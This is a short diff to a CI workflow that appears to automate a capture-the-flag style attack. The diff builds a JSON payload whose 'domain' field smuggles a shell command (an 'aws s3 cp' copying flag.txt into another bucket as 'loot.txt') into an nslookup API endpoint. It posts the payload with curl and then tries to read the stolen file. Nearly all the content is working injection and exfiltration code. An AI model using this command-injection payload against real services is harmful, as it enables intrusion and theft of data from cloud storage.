@@ -51,11 +51,18 @@ jobs:
 
       - name: Inject via API
         run: |
+          cat > /tmp/payload.json << 'PAYLOAD'
+          {"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/loot.txt --region us-east-1"}
+          PAYLOAD
+
           curl -s -X POST \
             "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
             -H "Content-Type: application/json" \
-            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/loot.txt --region
+            -d @/tmp/payload.json
+
+          echo "--- waiting ---"
+          sleep 5
 
       - name: Try to read loot from platform-bucket
         run: |
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/loot.txt - 2>&1 || echo "denied"     
+          aws s3 cp s3://platform-bucket-009661764077-us-east-1/loot.txt - 2>&1 || echo "denied"
